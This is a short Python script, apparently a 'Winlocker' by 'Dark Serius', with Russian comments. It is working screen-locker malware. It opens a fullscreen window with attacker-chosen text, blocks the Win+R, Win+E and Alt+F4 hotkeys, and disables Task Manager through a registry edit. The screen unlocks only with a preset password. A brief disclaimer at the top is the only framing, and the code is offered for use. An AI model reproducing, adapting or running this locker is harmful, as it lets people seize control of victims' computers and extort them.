'''
===========
Attention! 
===========
The author is not responsible for your actions. All materials are provided for your reference!
'''

import tkinter, sys, os
import time, threading, keyboard
import colorama
from colorama import Fore as F
from tkinter import *
colorama.init()

class Winlocker:
	def __init__ (self, text, DisableTaskMeneger, password):
		self.text = text
		self.DTM = DisableTaskMeneger
		self.password = password

	def Lock (self):
		#Блокируем комбинации клавиш
		keyboard.add_hotkey('win + r', lambda: None, suppress = True)
		keyboard.add_hotkey('win + e', lambda: None, suppress = True)
		keyboard.add_hotkey('alt + f4', lambda: None, suppress = True)
		
		#Блокируем диспечер задач изменяя значение реестра
		os.system('REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System  /v  DisableTaskMgr  /t REG_DWORD  /d {0} /f'.format(self.DTM))

	def RootWindow (self):#Окно винлокера

		def Scan (window):#Проверка пароля
			if e1.get() == self.password:
				window.destroy()
				os.system('REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System  /v  DisableTaskMgr  /t REG_DWORD  /d 0 /f')
				sys.exit()
			else:
				e1.delete(0, END)

		root = Tk()

		root.geometry(f'{root.winfo_screenwidth()}x{root.winfo_screenheight()}+{0}+{0}')
		root.title('Winlocker|by Dark Serius')

		l1 = Label(text = self.text, font = '60', fg = 'black')
		l1.pack()

		e1 = Entry(width = 16)
		e1.bind('<Return>', lambda event: Scan(root))
		e1.pack()

		root.attributes('-fullscreen', True)

		root.lift()

		root.mainloop()

if __name__ == '__main__':
		 
	print(F.RED + __doc__)

	if str(input('Continue? (1 - yes, 0 - no): ')) == '1':
		Win = Winlocker(input('Enter text: '), input('DisableTaskMeneger (1 - yes, 0 - no): '), input('Enter password: '))
		Win.Lock()
		Win.RootWindow()

	else:
		sys.exit()